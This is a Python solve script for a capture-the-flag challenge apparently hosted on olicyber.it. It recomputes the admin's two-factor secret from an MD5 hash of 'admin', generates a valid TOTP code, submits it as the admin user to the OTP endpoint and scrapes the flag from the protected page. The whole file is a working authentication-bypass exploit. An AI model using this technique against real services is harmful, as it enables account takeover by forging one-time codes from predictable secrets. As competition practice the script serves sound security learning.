#!/usr/bin/env python3

from base64 import b32encode
from hashlib import md5
from bs4 import BeautifulSoup
import requests, pyotp, os

site = "http://splashbox.challs.olicyber.it/"
secret = b32encode(md5(b'admin').digest().hex().encode()).decode().replace("=", "").lower()
payload = f"otpauth://totp/SplashBox:admin?secret={ secret }&issuer=SplashBox"
otp = pyotp.parse_uri(payload)

data = {"username":os.urandom(8).hex(), "password": os.urandom(8).hex()}
r = requests.post(site + "register.php", data=data)
r = requests.post(site + "login.php", data=data)
s = requests.Session()
s.post(site + "otp.php", data={"username":"admin", "otpcode":str(otp.now())})
flag = s.get(site + "?page=stash")

zuppetta = BeautifulSoup(flag.text, "html.parser")
for i in zuppetta.find_all("p"):
    if "flag" in str(i):
        print(str(i).replace('<p class="card-text">', "").replace("</p>", ""))
